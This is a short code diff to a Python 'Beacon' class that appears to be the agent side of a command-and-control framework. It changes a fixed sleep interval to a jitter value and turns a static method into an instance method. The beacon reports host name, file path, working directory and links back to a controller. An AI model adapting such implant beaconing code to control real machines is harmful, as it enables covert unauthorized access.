@@ -61,8 +61,7 @@ class Beacon:
             beacon = self._build_beacon(self.address, instructions['links'])
             self.send(beacon)
 
-    @staticmethod
-    def _build_beacon(target, links=[]):
+    def _build_beacon(self, target, links=[]):
         return dict(
             Name=socket.gethostname(),
             Location=__file__,
@@ -72,7 +71,7 @@ class Beacon:
             Pwd=os.getcwd(),
             Target=target,
             Links=links,
-            Sleep=15,
+            Sleep=self.jitter,
         )
 
     @staticmethod
